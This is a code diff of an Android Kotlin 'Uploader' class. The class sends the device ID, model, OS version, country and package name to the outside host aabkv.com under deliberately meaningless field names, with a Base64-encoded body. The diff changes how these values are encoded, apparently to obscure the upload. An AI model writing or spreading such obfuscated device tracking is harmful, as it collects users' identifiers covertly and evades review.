@@ -12,6 +12,7 @@ import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import org.json.JSONObject
+import java.lang.StringBuilder
 import java.util.*
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.collections.HashMap
@@ -47,7 +48,12 @@ class Uploader: CoroutineScope by GlobalScope {
         val coorddles = demonsttems + burgltesy
 
         val deviceId = Devices.getAndroidID(App.ins)
-        val httpUrl = "https://aabkv.com/dt?anticients=Android&clasings=${deviceId}&natris=fracnth&864=${BuildConfig.VERSION_NAME}"
+        val verName = BuildConfig.VERSION_NAME.split(".")
+        val kilo = StringBuilder()
+        for (element in verName) {
+            kilo.append(element).append("864")
+        }
+        val httpUrl = "https://aabkv.com/dt?anticients=Android&clasings=${deviceId}&natris=fracnth&kilomicate=${kilo.substring(0, kilo.length - 3)}"
         val header = HashMap<String, String>().apply {
             put("comphead", Locale.getDefault().country)
             put("wricates", "0")
@@ -64,7 +70,7 @@ class Uploader: CoroutineScope by GlobalScope {
             })
             bodyJSON.put(
                 "aioff",
-                "aioff=${System.currentTimeMillis()}&aioff=${App.ins.packageName}&first_country=${App.ins.firstCountry}&aioff=${Build.VERSION.RELEASE}"
+                "${System.currentTimeMillis()}=&${App.ins.packageName}=&${App.ins.firstCountry}=&${Build.VERSION.RELEASE}"
             )
             bodyJSON.put("intenor", JSONObject().apply {
                 put("effammer", Build.MODEL)
@@ -77,6 +83,7 @@ class Uploader: CoroutineScope by GlobalScope {
             bodyJSON.put("demonsttems", demonsttems)
             bodyJSON.put("dogs", "")
             bodyJSON.put("beeep", "")
+            bodyJSON.put("vesfiers", System.currentTimeMillis().toString())
 
             var bodyString = Base64.encodeToString(bodyJSON.toString().toByteArray(), Base64.NO_WRAP)
             bodyString = bodyString.replace("=", "")
